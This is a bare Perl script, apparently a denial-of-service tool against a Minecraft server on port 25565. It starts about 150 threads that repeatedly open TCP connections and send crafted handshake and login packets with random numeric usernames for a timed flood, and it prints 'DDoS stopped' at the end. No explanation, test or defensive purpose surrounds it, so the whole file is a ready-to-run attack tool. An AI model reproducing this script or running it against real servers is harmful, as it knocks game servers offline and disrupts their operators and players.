use Socket;
use threads;
$host = '127.0.0.1';
$port = 25565;
$thread = 150;
$protocol = chr(47);
$time_ddos = 20;
$connects = 0;
for ($i=0;$i<=$thread;$i++){
    threads->new(\&new_bot);
	print "Starting $i thread\n";
}
sleep $time_ddos;
print "DDoS stopped";
exit(0);
sub new_bot
{
    sleep 5;
    while (1) {
	    $connects += 1;
        socket($sock, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
        connect($sock , sockaddr_in($port, inet_aton($host)));
        $username = 1000000000 + int(rand(9999999999 - 1000000000));
        send($sock , "\x06\x00$protocol\x00\x00\x00\x02\x0c\x00\n$username" , 0);
        print "[$username/$connects]\n";
        sleep(0.01);
        close($sock);
    }
}
